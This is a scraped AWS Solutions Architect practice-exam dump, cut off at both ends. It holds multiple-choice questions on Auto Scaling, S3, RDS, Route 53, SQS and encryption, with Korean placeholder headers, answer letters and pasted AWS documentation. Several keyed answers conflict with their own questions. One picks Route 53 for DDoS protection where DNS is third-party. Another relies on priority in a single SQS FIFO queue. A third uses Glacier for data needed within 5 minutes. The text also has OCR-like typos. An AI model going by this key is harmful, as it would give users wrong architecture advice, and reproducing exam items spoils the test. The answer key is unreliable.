copy of your original DB instance DB instances that are encrypted can\u0026rsquo;t be modified to disable encryption. You can\u0026rsquo;t have an encrypted read replica of an unencrypted DB instance or an unencrypted read replica of an encrypted DB instance. Encrypted read replicas must be encrypted with the same key as the source DB instance when both are in the same AWS Region. You can\u0026rsquo;t restore an unencrypted backup or snapshot to an encrypted DB instance. To copy an encrypted snapshot from one AWS Region to another, you must specify the KMS key identifier of the destination AWS Region. This is because KMS encryption keys are specific to the AWS Region that they are created in. https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html\r\r\r\r   QUESTION A company hosts its website on AWS. To address the highly variable demand, the company has implemented Amazon EC2 Auto Scaling. Management is concerned that the company is overprovisioning its infrastructure, especially at the front end of the three-tier application. A solutions architect needs to ensure costs are optimized without impacting performance. What should the solutions architect do to accomplish this?\nA. Use Auto Scaling with Reserved Instances. B. Use Auto Scaling with a scheduled scaling policy. C. Use Auto Scaling with the suspend-resume feature D. Use Auto Scaling with a target tracking scaling policy. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company uses a legacy on-premises analytics application that operates on gigabytes of csv files and represents months of data The legacy application cannot handle the growing size of csv files New csv files are added daily from various data sources to a central on-premises storage location The company wants to continue to support the legacy application while users learn AWS analytics services To achieve this, a solutions architect wants to maintain two synchronized copies of all the csv files on-premises and in Amazon S3 Which solution should the solutions architect recommend?\nA. Deploy AWS DataSync on-premises. Configure DataSync to continuously replicate the csv files between the company\u0026rsquo;s on-premises storage and the company\u0026rsquo;s S3 bucket B. Deploy an on-premises file gateway Configure data sources to write the csv files to the file gateway Point the legacy analytics application to the file gateway The file gateway should replicate the csv files to Amazon S3 C. Deploy an on-premises volume gateway. Configure data sources to write the csv files to the volume gateway. Point the legacy analytics application to the volume gateway. The volume gateway should replicate data to Amazon S3. D. Deploy AWS DataSync on-premises Configure DataSync to continuously replicate the csv files between on-premises and Amazon Elastic File System (Amazon EFS) Enable replication from Amazon EFS to the company\u0026rsquo;s S3 bucket. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A solutions architect is designing a solution where users will De directed to a backup static error page it the primary website is unavailable The primary website\u0026rsquo;s DNS records are hosted in Amazon Route 53 where their domain is pointing to an Application Load Balancer (ALB) Which configuration should the solutions architect use to meet the company\u0026rsquo;s needs while minimizing changes and infrastructure overhead?\nA. Point a Route 53 alias record to an Amazon CloudFront distribution with the ALB as one of its origins Then, create custom error pages for the distribution B. Set up a Route 53 active-passive failover configuration Direct traffic to a static error page hosted within an Amazon S3 bucket when Route 53 health checks determine that the ALB endpoint is unhealthy C. Update the Route 53 record to use a latency-based routing policy Add the backup static error page hosted within an Amazon S3 bucket to the record so the traffic is sent to the most responsive endpoints D. Set up a Route 53 active-active configuration with the ALB and an Amazon EC2 instance hosting a static error page as endpoints Route 53 will only send requests to the instance if the health checks fail for the ALB \r문제 풀이\r...\r\rAnswer: B Explanation Active-passive failover Use an active-passive failover configuration when you want a primary resource or group of resources to be available the majority of the time and you want a secondary resource or group of resources to be on standby in case all the primary resources become unavailable. When responding to queries, Route 53 includes only the healthy primary resources. If all the primary resources are unhealthy, Route 53 begins to include only the healthy secondary resources in response to DNS queries. To create an active-passive failover configuration with one primary record and one secondary record, you just create the records and specify Failover for the routing policy. When the primary resource is healthy, Route 53 responds to DNS queries using the primary record. When the primary resource is unhealthy, Route 53 responds to DNS queries using the secondary record. How Amazon Route 53 averts cascading failures As a first defense against cascading failures, each request routing algorithm (such as weighted and failover) has a mode of last resort. In this special mode, when all records are considered unhealthy, the Route 53 algorithm reverts to considering all records healthy. For example, if all instances of an application, on several hosts, are rejecting health check requests, Route 53 DNS servers will choose an answer anyway and return it rather than returning no DNS answer or returning an NXDOMAIN (non-existent domain) response. An application can respond to users but still fail health checks, so this provides some protection against misconfiguration. Similarly, if an application is overloaded, and one out of three endpoints fails its health checks, so that it\u0026rsquo;s excluded from Route 53 DNS responses, Route 53 distributes responses between the two remaining endpoints. If the remaining endpoints are unable to handle the additional load and they fail, Route 53 reverts to distributing requests to all three endpoints. https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/dns-failover-types.html https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/dns-failover-problems.html\r\r\r\r   QUESTION A company has a legacy application that processes data in two parts The second part of the process takes longer than the first, so the company has decided to rewrite the application as two microservices running on Amazon ECS that can scale independently. How should a solutions architect integrate the microservices?\nA. Implement code in microservice 1 to send data to an Amazon S3 bucket. Use S3 event notifications to invoke microservice 2. B. Implement code in microservice 1 to publish data to an Amazon SNS topic Implement code in microservice 2 to subscribe to this topic C. Implement code in microservice 1 to send data to Amazon Kinesis Data Firehose. Implement code in microservice 2 to read from Kinesis Data Firehose. D. Implement code in microservice 1 to send data to an Amazon SQS queue Implement code in microservice 2 to process messages from the queue \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company runs a multi-tier web application that hosts news content The application runs on Amazon EC2 instances behind an Application Load Balancer. The instances run in an EC2 Auto Scaling group across multiple Availability Zones and use an Amazon Aurora database. A solutions architect needs to make the application more resilient to periodic increases in request rates. Which architecture should the solutions architect implement? (Select TWO )\nA. Add AWS Shield. B. Add Aurora Replicas C. Add AWS Direct Connect D. Add AWS Global Accelerator. E. Add an Amazon CloudFront distribution in front of the Application Load Balancer \r문제 풀이\r...\r\rAnswer: D E Explanation AWS Global Accelerator Acceleration for latency-sensitive applications Many applications, especially in areas such as gaming, media, mobile apps, and financials, require very low latency for a great user experience. To improve the user experience, Global Accelerator directs user traffic to the application endpoint that is nearest to the client, which reduces internet latency and jitter. Global Accelerator routes traffic to the closest edge location by using Anycast, and then routes it to the closest regional endpoint over the AWS global network. Global Accelerator quickly reacts to changes in network performance to improve your users' application performance. Amazon CloudFront Amazon CloudFront is a fast content delivery network (CDN) service that securely delivers data, videos, applications, and APIs to customers globally with low latency, high transfer speeds, all within a developer-friendly environment. https://docs.aws.amazon.com/global-accelerator/latest/dg/introduction-benefits-of-migrating.html\r\r\r\r   QUESTION A company\u0026rsquo;s application is running on Amazon EC2 instances within an Auto Scaling group behind an Elastic Load Balancer Based on the application\u0026rsquo;s history, the company anticipates a spike in traffic during a holiday each year A solutions architect must design a strategy to ensure that the Auto Scaling group proactively increases capacity to minimize any performance impact on application users Which solution will meet these requirements?\nA. Create an Amazon CloudWatch alarm to scale up the EC2 instances when CPU utilization exceeds 90% B. Create a recurring scheduled action to scale up the Auto Scaling group before the expected period of peak demand C. Increase the minimum and maximum number of EC2 instances in the Auto Scaling group during the peak demand period D. Configure an Amazon Simple Notification Service (Amazon SNS) notification to send alerts when there are auto scaling EC2_INSTANCE_LAUNCH events \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company is migrating a Linux-based web server group to AWS The web servers must access files in a shared file store for some content To meet the migration date, minimal changes can be made What should a solutions architect do to meet these requirements?\nA. Create an Amazon S3 Standard bucket with access to the web server. B. Configure an Amazon CloudFront distribution with an Amazon S3 bucket as the origin C. Create an Amazon Elastic File System (Amazon EFS) volume and mount it on all web servers D. Configure Amazon Elastic Block Store (Amazon EBS) Provisioned IOPS SSD (io1) volumes and mount them on all web servers. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company wants to host a web application on AWS that will communicate to a database within a VPC. The application should be highly available. What should a solutions architect recommend?\nA. Create two Amazon EC2 instances to host the web servers behind a load balancer, and then deploy the database on a large instance. B. Deploy a load balancer in multiple Availability Zones with an Auto Scaling group for the web servers, and then deploy Amazon RDS in multiple Availability Zones. C. Deploy a load balancer in the public subnet with an Auto Scaling group for the web servers, and then deploy the database on an Amazon EC2 instance in the private subnet. D. Deploy two web servers with an Auto Scaling group, configure a domain that points to the two web servers, and then deploy a database architecture in multiple Availability Zones. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company receives structured and semi-structured data from various sources once every day. A solutions architect needs to design a solution that leverages big data processing frameworks. The data should be accessible using SQL queries and business intelligence tools. What should the solutions architect recommend to build the MOST high-performing solution?\nA. Use AWS Glue to process data and Amazon S3 to store data B. Use Amazon EMR to process data and Amazon Redshift to store data C. Use Amazon EC2 to process data and Amazon Elastic Block Store (Amazon EBS) to store data D. Use Amazon Kinesis Data Analytics to process data and Amazon Elastic File System (Amazon EFS) to store data \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company\u0026rsquo;s web application is running on Amazon EC2 instances behind an Application Load Balancer. The company recently changed its policy, which now requires the application to be accessed from one specific country only. Which configuration will meet this requirement?\nA. Configure the security group for the EC2 instances. B. Configure the security group on the Application Load Balancer. C. Configure AWS WAF on the Application Load Balancer in a VPC. D. Configure the network ACL for the subnet that contains the EC2 instances. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company wants to migrate a workload to AWS. The chief information security officer requires that all data be encrypted at rest when stored in the cloud. The company wants complete control of encryption key lifecycle management. The company must be able to immediately remove the key material and audit key usage independently of AWS CloudTrail. The chosen services should integrate with other storage services that will be used on AWS. Which services satisfies these security requirements?\nA. AWS CloudHSM with the CloudHSM client B. AWS Key Management Service (AWS KMS) with AWS CloudHSM C. AWS Key Management Service (AWS KMS) with an external key material origin D. AWS Key Management Service (AWS KMS) with AWS managed customer master keys (CMKs) \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company hosts an application used to upload files to an Amazon S3 bucket Once uploaded, the files are processed to extract metadata, which takes less than 5 seconds. The volume and frequency of the uploads vanes from a few files each hour to hundreds of concurrent uploads. The company has asked a solutions architect to design a cost effective architecture that will meet these requirements. What should the solutions architect recommend?\nA. Configure AWS CloudTrail trails to log S3 API calls Use AWS AppSync to process the files B. Configure an object-created event notification within the S3 bucket to invoke an AWS Lambda function to process the files. C. Configure Amazon Kinesis Data Streams to process and send data to Amazon S3 Invoke an AWS Lambda function to process the files D. Configure an Amazon Simple Notification Service (Amazon SNS) topic to process the files uploaded to Amazon S3. Invoke an AWS Lambda function to process the files. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company hosts an online shopping application that stores all orders in an Amazon RDS for PostgreSQL Single-AZ DB instance Management wants to eliminate single points of failure and has asked a solutions architect to recommend an approach to minimize database downtime without requiring any changes to the application code.\nWhich solution meets these requirements?\nA. Convert the existing database instance to a Multi-AZ deployment by modifying the database instance and specifying the Multi-AZ option. B. Create a new RDS Multi-AZ deployment Take a snapshot of the current RDS instance and restore the new Multi-AZ deployment with the snapshot C. Create a read-only replica of the PostgreSQL database in another Availability Zone Use Amazon Route 53 weighted record sets to distribute requests across the databases. D. Place the RDS for PostgreSQL database in an Amazon EC2 Auto Scaling group with a minimum group size of two Use Amazon Route 53 weighted record sets to distribute requests across instances. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company\u0026rsquo;s web application uses an Amazon RDS PostgreSQL DB instance to store its application data. During the financial closing period at the start of every month. Accountants run large queries that impact the database\u0026rsquo;s performance due to high usage. The company wants to minimize the impact that the reporting activity has on the web application. What should a solutions architect do to reduce the impact on the database with the LEAST amount of effort?\nA. Create a read replica and direct reporting traffic to the replica. B. Create a Multi-AZ database and direct reporting traffic to the standby. C. Create a cross-Region read replica and direct reporting traffic to the replica. D. Create an Amazon Redshift database and direct reporting traffic to the Amazon Redshift database. \r문제 풀이\r...\r\rAnswer: A Explanation https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_ReadRepl.html Amazon RDS uses the MariaDB, MySQL, Oracle, PostgreSQL, and Microsoft SQL Server DB engines' built-in replication functionality to create a special type of DB instance called a read replica from a source DB instance. Updates made to the source DB instance are asynchronously copied to the read replica. You can reduce the load on your source DB instance by routing read queries from your applications to the read replica. When you create a read replica, you first specify an existing DB instance as the source. Then Amazon RDS takes a snapshot of the source instance and creates a read-only instance from the snapshot. Amazon RDS then uses the asynchronous replication method for the DB engine to update the read replica whenever there is a change to the source DB instance. The read replica operates as a DB instance that allows only read-only connections. Applications connect to a read replica the same way they do to any DB instance. Amazon RDS replicates all databases in the source DB instance. https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_ReadRepl.html\r\r\r\r   QUESTION A company runs a high performance computing (HPC) workload on AWS. The workload required low-latency network performance and high network throughput with tightly coupled nodeto-node communication. The Amazon EC2 instances are properly sized for compute and storage capacity, and are launched using default options. What should a solutions architect propose to improve the performance of the workload?\nA. Choose a cluster placement group while launching Amazon EC2 instances B. Choose dedicated instance tenancy while launching Amazon EC2 instances C. Choose an Elastic Inference accelerator while launching Amazon EC2 instances D. Choose the required capacity reservation while launching Amazon EC2 instances. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company has an application with a REST-based Interface that allows data to be received in near-real time from a third-party vendor Once received, the application processes and stores the data for further analysis. The application Is running on Amazon EC2 instances. The third-party vendor has received many 503 Service Unavailable Errors when sending data to the application. When the data volume spikes, the compute capacity reaches its maximum limit and the application is unable to process all requests. Which design should a solutions architect recommend to provide a more scalable solution?\nA. Use Amazon Kinesis Data Streams to ingest the data Process the data using AWS Lambda functions. B. Use Amazon API Gateway on top of the existing application. Create a usage plan with a quota Iimit for the third-party vendor. C. Use Amazon Simple Notification Service (Amazon SNS) to ingest the data Put the EC2 instances in an Auto Scaling group behind an Application Load Balancer. D. Repackage the application as a container. Deploy the application using Amazon Elastic Container Service (Amazon ECS) using the EC2 launch type with an Auto Scaling group. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A solutions architect needs to ensure that all Amazon Elastic Block Store (Amazon EBS) volumes restored from unencrypted EBS snapshots are encrypted What should the solutions architect do to accomplish this?\nA. Enable EBS encryption by default for the AWS Region B. Enable EBS encryption by default for the specific volumes C. Create a new volume and specify the symmetric customer master key (CMK) to use for encryption D. Create a new volume and specify the asymmetric customer master key (CMK) to use for encryption. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company has an on-premises data center that is running out of storage capacity. The company wants to migrate its storage infrastructure to AWS while minimizing bandwidth costs The solution must allow for immediate retrieval of data at no additional cost. How can these requirements be met?\nA. Deploy Amazon S3 Glacier Vault and enable expedited retrieval. Enable provisioned retrieval capacity for the workload B. Deploy AWS Storage Gateway using cached volumes. Use Storage Gateway to store data in Amazon S3 while retaining copies of frequently accessed data subsets locally. C. Deploy AWS Storage Gateway using stored volumes to store data locally. Use Storage Gateway to asynchronously back up point-in-time snapshots of the data to Amazon S3 D. Deploy AWS Direct Connect to connect with the on-premises data center. Configure AWS Storage Gateway to store data locally. Use Storage Gateway to asynchronously bacK up potnt-tn-time snapshots of the data to Amazon S3. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company stores user data in AWS. The data is used continuously with peak usage during business hours. Access patterns vary, with some data not being used tor months at a time. A solution architect must choose a cost that maintains the highest level ot durability while maintaining high availability. Which storage solution meets these requirements?\nA. Amazon S3 Standard B. Amazon S3 intelligent Tiering C. Amazon S3 Glacier Deep Archive D. Amazon S3 One Zone-Infrequent Access (S3 One Zone-IA) \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION An online photo application lets users upload photos and perform image editing operations The application offers two classes of service free and paid Photos submitted by paid users are processed before those submitted by free users Photos are uploaded to Amazon S3 and the job information is sent to Amazon SQS. Which configuration should a solutions architect recommend?\nA. Use one SQS FIFO queue Assign a higher priority to the paid photos so they are processed first B. Use two SQS FIFO queues: one for paid and one for free Set the free queue to use short polling and the paid queue to use long polling C. Use two SQS standard queues one for paid and one for free Configure Amazon EC2 instances to prioritize polling for the paid queue over the free queue. D. Use one SQS standard queue. Set the visibility timeout of the paid photos to zero Configure Amazon EC2 instances to prioritize visibility settings so paid photos are processed first \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company plans to store sensitive user data on Amazon S3. Internal security compliance requirement mandata encryption of data before sending it to Amazon S3. What should a solution architect recommend to satisfy these requirements?\nA. Server-side encryption with customer-provided encryption keys B. Client-side encryption with Amazon S3 managed encryption keys C. Server-side encryption with keys stored in AWS key Management Service (AWS KMS) D. Client-side encryption with a master key stored in AWS Key Management Service (AWS KMS) \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company requires that all versions of objects in its Amazon S3 bucket be retained Current object versions will be frequently accessed during the first 30 days, after which they will be rarely accessed and must be retrievable within 5 minutes Previous object versions need to be kept forever, will be rarely accessed, and can be retrieved within 1 week. All storage solutions must be highly available and highly durable What should a solutions architect recommend to meet these requirements in the MOST cost-effective manner?\nA. Create an S3 lifecycle policy for the bucket that moves current object versions from S3 Standard storage to S3 Glacier after 30 days and moves previous object versions to S3 Glacier after 1 day. B. Create an S3 lifecycle policy for the bucket that moves current object versions from S3 Standard storage to S3 Glacier after 30 days and moves previous object versions to S3 Glacier Deep Archive after 1 day C. Create an S3 lifecycle policy for the bucket that moves current object versions from S3 Standard storage to S3 Standard-infrequent Access (S3 Standard-IA) after 30 days and moves previous object versions to S3 Glacier Deep Archive after 1 day D. Create an S3 lifecycle policy for the bucket that moves current object versions from S3 Standard storage to S3 One Zone-Infrequent Access (S3 One Zone-IA) after 30 days and moves previous object versions to S3 Glacier Deep Archive after 1 day \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company runs an application in a branch office within a small data closet with no virtualized compute resources. The application data is stored on an NFS volume. Compliance standards require a daily offsite backup of the NFS volume. Which solution meet these requirements?\nA. Install an AWS Storage Gateway file gateway on premises to replicate the data to Amazon S3. B. Install an AWS Storage Gateway file gateway hardware appliance on premises to replicate the data to Amazon S3. C. Install an AWS Storage Gateway volume gateway with stored volumes on premises to replicate the data to Amazon S3. D. Install an AWS Storage Gateway volume gateway with cached volumes on premises to replicate the data to Amazon S3. \r문제 풀이\r...\r\rAnswer: B Explanation https://aws.amazon.com/storagegateway/file/ AWS Storage Gateway Hardware Appliance\nHardware Appliance Storage Gateway is available as a hardware appliance, adding to the existing support for VMware ESXi, Microsoft Hyper-V, and Amazon EC2. This means that you can now make use of Storage Gateway in situations where you do not have a virtualized environment, server-class hardware or IT staff with the specialized skills that are needed to manage them. You can order appliances from Amazon.com for delivery to branch offices, warehouses, and \u0026ldquo;outpost\u0026rdquo; offices that lack dedicated IT resources. Setup (as you will see in a minute) is quick and easy, and gives you access to three storage solutions: File Gateway - A file interface to Amazon S3, accessible via NFS or SMB. The files are stored as S3 objects, allowing you to make use of specialized S3 features such as lifecycle management and crossregion replication. You can trigger AWS Lambda functions, run Amazon Athena queries, and use Amazon Macie to discover and classify sensitive data. https://aws.amazon.com/blogs/aws/new-aws-storage-gateway-hardware-appliance/\n\r\r\r   QUESTION Organizers for a global event want to put daily reports online as static HTML pages The pages are expected to generate millions of views from users around the world The files are stored in an Amazon S3 bucket A solutions architect has been asked to design an efficient and effective solution Which action should the solutions architect take to accomplish this?\nA. Generate presigned URLs for the files B. Use cross-Region replication to all Regions C. Use the geoproximity feature of Amazon Route 53 D. Use Amazon CloudFront with the S3 bucket as its origin \r문제 풀이\r...\r\rAnswer: D Explanation Using Amazon S3 Origins, MediaPackage Channels, and Custom Origins for Web Distributions Using Amazon S3 Buckets for Your Origin When you use Amazon S3 as an origin for your distribution, you place any objects that you want CloudFront to deliver in an Amazon S3 bucket. You can use any method that is supported by Amazon S3 to get your objects into Amazon S3, for example, the Amazon S3 console or API, or a third-party tool. You can create a hierarchy in your bucket to store the objects, just as you would with any other Amazon S3 bucket. Using an existing Amazon S3 bucket as your CloudFront origin server doesn\u0026rsquo;t change the bucket in any way; you can still use it as you normally would to store and access Amazon S3 objects at the standard Amazon S3 price. You incur regular Amazon S3 charges for storing the objects in the bucket. Using Amazon S3 Buckets Configured as Website Endpoints for Your Origin You can set up an Amazon S3 bucket that is configured as a website endpoint as custom origin with CloudFront. When you configure your CloudFront distribution, for the origin, enter the Amazon S3 static website hosting endpoint for your bucket. This value appears in the Amazon S3 console, on the Properties tab, in the Static website hosting pane. For example: http://bucket-name.s3-website-region.amazonaws.com For more information about specifying Amazon S3 static website endpoints, see Website endpoints in the Amazon Simple Storage Service Developer Guide. When you specify the bucket name in this format as your origin, you can use Amazon S3 redirects and Amazon S3 custom error documents. For more information about Amazon S3 features, see the Amazon S3 documentation. Using an Amazon S3 bucket as your CloudFront origin server doesn\u0026rsquo;t change it in any way. You can still use it as you normally would and you incur regular Amazon S3 charges.\nhttps://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/DownloadDistS3AndCusto mOrigins.h\n\r\r\r   QUESTION A database is on an Amazon RDS MYSQL 5.6 Multi-AZ DB instance that experience highly dynamic reads. Application developers notice a significant slowdown when testing read performance from a secondary AWS Region. The developers want a solution that provides less than 1 second of read replication latency. What should the solutions architect recommend?\nA. Install MySQL on Amazon EC2 in (he secondary Region. B. Migrate the database to Amazon Aurora with cross-Region replicas. C. Create another RDS for MySQL read replica in the secondary. D. Implement Amazon ElastiCache to improve database query performance. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A data science team requires storage for nightly log processing. The size and number of logs is unknown and will persist for 24 hours only What is the MOST cost-effective solution?\nA. Amazon S3 Glacier B. Amazon S3 Standard C. Amazon S3 intelligent-Tiering D. Amazon S3 One Zone-Infrequent Access {S3 One Zone-IA) \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A media company has an application that tracks user clicks on its websites and performs analytics to provide near-real time recommendations. The application has a Heel of Amazon EC2 instances that receive data from the websites and send the data lo an Amazon RDS DB instance Another fleet of EC2 instances hosts the portion of the application that is continuously checking changes in the database and executing SQL queries to provide recommendations. Management has requested a redesign to decouple the infrastructure The solution must ensure that data analysts are writing SQL to analyze the data only No data can the lost during the deployment What should a solutions architect recommend?\nA. Use Amazon Kinesis Data Streams to capture the data from the websites Kinesis Data Firehose to persist the data on Amazon S3, and Amazon Athena to query the data B. Use Amazon Kinesis Data Streams to capture the data from the websites. Kinesis Data Analytics to query the data, and Kinesis Data Firehose to persist the data on Amazon S3 C. Use Amazon Simple Queue Service (Amazon SQS) to capture the data from the websites, keep the fleet of EC2 instances, and change to a bigger instance type in the Auto Scaling group configuration D. Use Amazon Simple Notification Service (Amazon SNS) to receive data from the websites and proxy the messages to AWS Lambda functions that execute the queries and persist the data Change Amazon RDS to Amazon Aurora Serverless to persist the data \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company has deployed an API in a VPC behind an internet-facing Application Load Balancer (ALB) An application that consumes the API as a client is deployed in a second account in private subnets behind a NAT gateway. When requests to the client application increase, the NAT gateway costs are higher than expected. A solutions architect has configured the ALB to be internal. Which combination of architectural changes will reduce the NAT gateway costs?(Select TWO )\nA. Configure a VPC peering connection between the two VPCs. Access the API using the private address B. Configure an AWS Direct Connect connection between the two VPCs. Access the API using the private address. C. Configure a ClassicLink connection for the API into the client VPC Access the API using the ClassicLink address. D. Configure a PrivateLink connection for the API into the client VPC. Access the API using the PrivateLink address. E. Configure an AWS Resource Access Manager connection between the two accounts Access the API using the private address \r문제 풀이\r...\r\rAnswer: A D \r\r\r   QUESTION A product team is creating a new application that will store a large amount of data The data will be analyzed hourly and modified by multiple Amazon EC2 Linux instances The application team believes the amount of space needed will continue to grow for the next 6 months Which set of actions should a solutions architect take to support these needs?\nA. Store the data in an Amazon EBS volume Mount the EBS volume on the application instances B. Store the data in an Amazon EFS file system Mount the file system on the application instances C. Store the data in Amazon S3 Glacier Update the vault policy to allow access to the application instances D. Store the data in Amazon S3 Standard-Infrequent Access (S3 Standard-IA) Update the bucket policy to allow access to the application instances \r문제 풀이\r...\r\rAnswer: B Explanation Amazon Elastic File System Amazon Elastic File System (Amazon EFS) provides a simple, scalable, fully managed elastic NFS file system for use with AWS Cloud services and on-premises resources. It is built to scale on demand to petabytes without disrupting applications, growing and shrinking automatically as you add and remove files, eliminating the need to provision and manage capacity to accommodate growth. Amazon EFS is designed to provide massively parallel shared access to thousands of Amazon EC2 instances, enabling your applications to achieve high levels of aggregate throughput and IOPS with consistent low latencies. Amazon EFS is well suited to support a broad spectrum of use cases from home directories to business-critical applications. Customers can use EFS to lift-and-shift existing enterprise applications to the AWS Cloud. Other use cases include: big data analytics, web serving and content management, application development and testing, media and entertainment workflows, database backups, and container storage. Amazon EFS is a regional service storing data within and across multiple Availability Zones (AZs) for high availability and durability. Amazon EC2 instances can access your file system across AZs, regions, and VPCs, while on-premises servers can access using AWS Direct Connect or AWS VPN. https://aws.amazon.com/efs/\r\r\r\r   QUESTION An application allows users at a company\u0026rsquo;s headquarters to access product data The product data is stored in an Amazon RDS MySQL DB instance. The operations team has isolated an application performance slowdown and wants to separate read traffic from write traffic. A solutions architect needs to optimize the application\u0026rsquo;s performance quickly. What should the solutions architect recommend?\nA. Change the existing database to a Multi-AZ deployment Serve the read requests from the primary Availability Zone B. Change the existing database to a Multi-AZ deployment Serve the read requests from the secondary Availability Zone C. Create read replicas for the database Configure the read replicas with half of the compute and storage resources as the source database D. Create read replicas for the database Configure the read replicas with the same compute and storage resources as the source database \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION An application running on AWS uses an Amazon Aurora Multi-AZ deployment for its database When evaluating performance metrics, a solutions architect discovered that the database reads are causing high I/O and adding latency to the write requests against the database What should the solutions architect do to separate the read requests from the write requests?\nA. Enable read-through caching on the Amazon Aurora database B. Update the application to read from the Multi-AZ standby instance C. Create a read replica and modify the application to use the appropriate endpoint D. Create a second Amazon Aurora database and link it to the primary database as a read replica. \r문제 풀이\r...\r\rAnswer: C Explanation Amazon RDS Read Replicas Amazon RDS Read Replicas provide enhanced performance and durability for RDS database (DB) instances. They make it easy to elastically scale out beyond the capacity constraints of a single DB instance for read-heavy database workloads. You can create one or more replicas of a given source DB Instance and serve high-volume application read traffic from multiple copies of your data, thereby increasing aggregate read throughput. Read replicas can also be promoted when needed to become standalone DB instances. Read replicas are available in Amazon RDS for MySQL, MariaDB, PostgreSQL, Oracle, and SQL Server as well as Amazon Aurora. For the MySQL, MariaDB, PostgreSQL, Oracle, and SQL Server database engines, Amazon RDS creates a second DB instance using a snapshot of the source DB instance. It then uses the engines' native asynchronous replication to update the read replica whenever there is a change to the source DB instance. The read replica operates as a DB instance that allows only read-only connections; applications can connect to a read replica just as they would to any DB instance. Amazon RDS replicates all databases in the source DB instance. Amazon Aurora futher extends the benefits of read replicas by employing an SSD-backed virtualized storage layer purpose-built for database workloads. Amazon Aurora replicas share the same underlying storage as the source instance, lowering costs and avoiding the need to copy data to the replica nodes. For more information about replication with Amazon Aurora, see the online documentation.\nhttps://aws.amazon.com/rds/features/read-replicas/\n\r\r\r   QUESTION A company is planning to migrate a business-critical dataset to Amazon S3. The current solution design uses a single S3 bucket in the us-east-1 Region with versioning enabled to store the dataset. The company\u0026rsquo;s disaster recovery policy states that all data multiple AWS Regions. How should a solutions architect design the S3 solution?\nA. Create an additional S3 bucket in another Region and configure cross-Region replication. B. Create an additional S3 bucket in another Region and configure cross-origin resource sharing (CORS). C. Create an additional S3 bucket with versioning in another Region and configure cross-Region replication. D. Create an additional S3 bucket with versioning in another Region and configure cross-origin resource (CORS). \r문제 풀이\r...\r\rAnswer: C Explanation Object Versioning Use Amazon S3 Versioning to keep multiple versions of an object in one bucket. For example, you could store my-image.jpg (version 111111) and my-image.jpg (version 222222) in a single bucket. S3 Versioning protects you from the consequences of unintended overwrites and deletions. You can also use it to archive objects so that you have access to previous versions. You must explicitly enable S3 Versioning on your bucket. By default, S3 Versioning is disabled. Regardless of whether you have enabled Versioning, each object in your bucket has a version ID. If you have not enabled Versioning, Amazon S3 sets the value of the version ID to null. If S3 Versioning is enabled, Amazon S3 assigns a version ID value for the object. This value distinguishes it from other versions of the same key. Enabling and suspending versioning is done at the bucket level. When you enable versioning on an existing bucket, objects that are already stored in the bucket are unchanged. The version IDs (null), contents, and permissions remain the same. After you enable S3 Versioning for a bucket, each object that is added to the bucket gets a version ID, which distinguishes it from other versions of the same key. Cross-origin resource sharing (CORS) Cross-origin resource sharing (CORS) defines a way for client web applications that are loaded in one domain to interact with resources in a different domain. With CORS support, you can build rich clientside web applications with Amazon S3 and selectively allow cross-origin access to your Amazon S3 resources. https://docs.aws.amazon.com/AmazonS3/latest/dev/ObjectVersioning.html https://docs.aws.amazon.com/AmazonS3/latest/dev/cors.html\r\r\r\r   QUESTION A company has an Amazon EC2 instance running on a private subnet that needs to access a public websites to download patches and updates. The company does not want external websites to see the EC2 instance IP address or initiate connection to it. How can a solution architect achieve this objective?\nA. Create a site-to-site VPN connection between the private subnet and the network in which the public site is deployed B. Create a NAT gateway in a public subnet Route outbound traffic from the private subnet through the NAI gateway C. Create a network ACL for the private subnet where the EC2 instance deployed only allows access from the IP address range of the public website D. Create a security group that only allows connections from the IP address range of the public website. Attach the security group to the EC2 instance. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company is preparing to launch a public-facing web application in the AWS Cloud The architecture consists of Amazon EC2 instances within a VPC behind an Elastic Load Balancer (ELB). A third party service is used for the DNS. The company\u0026rsquo;s solutions architect must recommend a solution to detect and protect against large scale DDoS attacks Which solution meets these requirements?\nA. Enable Amazon GuardDuty on the account B. Enable Amazon Inspector on the EC2 instances C. Enable AWS Shield and assign Amazon Route 53 to it. D. Enable AWS Shield Advanced and assign the ELB to it \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company has global users accessing an application deployed in different AWS Regions, exposing public static IP addresses. The users are experiencing poor performance when accessing the application over the internet. What should a solutions architect recommend to reduce internet latency?\nA. Set up AWS Global Accelerator and add endpoints. B. Set up AWS Direct Connect locations in multiple Regions. C. Set up an Amazon CloudFront distribution to access an application. D. Set up an Amazon Route 53 geoproximity routing policy to route traffic. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A solution architect is performing a security review of a recently migrated workload. The workload is a web application that consists of amazon EC2 instances in an Auto Scaling group behind an Application Load balancer. The solution architect must improve the security posture and minimize the 